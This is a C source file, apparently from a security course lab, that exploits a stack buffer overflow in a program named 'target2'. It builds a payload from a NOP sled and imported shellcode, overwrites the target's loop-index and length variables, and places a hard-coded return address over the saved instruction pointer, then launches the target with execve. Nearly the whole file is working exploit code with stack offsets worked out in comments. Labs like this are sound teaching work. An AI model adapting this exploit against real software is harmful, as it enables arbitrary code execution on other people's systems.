#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
//&rip=0x3021fe98
//&i=0x3021fe8c
//&len=0x3021fe88
//&buf=0x3021fd80
//280 from &buf to &rip = buf[256] + 8 + len(4) + i(4) + 8
#define SIZE_BF_LEN 264 //between buff and len 256+8
#define BUFSIZE 285 //280 from &buf to &rip + 4(target_ra) + 1('\0')
#define SHELLSIZE 45 //strlen(shellcode)=45

int
main ( int argc, char * argv[] )
{
    char *    args[3];
    char *    env[4];

    //addresses
    char target_ra[] = "\x80\xfd\x21\x30";//little-endian 0x3021fd80
    char new_i[] = "\x0c\x01\x00\x00";//0x0000010C 268, i start at buff[268]
    char new_len[] = "\x1c\x01\x00\x00";//0x0000011c 284

    //making overflow buffer
    char buff[BUFSIZE];

    //fill in the beginning with NOP

	//0
    for(int i=0;i<SIZE_BF_LEN-SHELLSIZE;i++)
    {
        buff[i] = '\x90'; //fill with NOP=0x90
    }

    //put shellcode after

	//219
    for(int i=0;i<SHELLSIZE;i++)
    {
        buff[SIZE_BF_LEN-SHELLSIZE+i] = shellcode[i];
    }

	//264
    for(int i=0;i<4;i++)
    {
        buff[SIZE_BF_LEN+i] = new_len[i];
    }

	//268
    for(int i=0;i<4;i++)
    {
        buff[SIZE_BF_LEN+4+i] = new_i[i];
    }

    //fill 8 bit between i and rip with NOP
    for(int i=0;i<8;i++)
    {
        buff[SIZE_BF_LEN+4+4+i] = '\x90'; //fill with NOP=0x90
    }

    //put guessed return address before null terminator
    for(int i=0;i<4;i++)
    {
        buff[BUFSIZE-5+i] = target_ra[i];
    }

    //put null terminator at the end of buffer
    buff[BUFSIZE-1] = '\0';

    args[0] = TARGET;
    args[1] = buff;
    args[2] = NULL;

    env[0] = &buff[267]; //skip null in len
    env[1] = &buff[268]; //skip null in len
	env[2] = &buff[271]; //skip null in i
	env[3] = &buff[272]; //skip null in i


    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}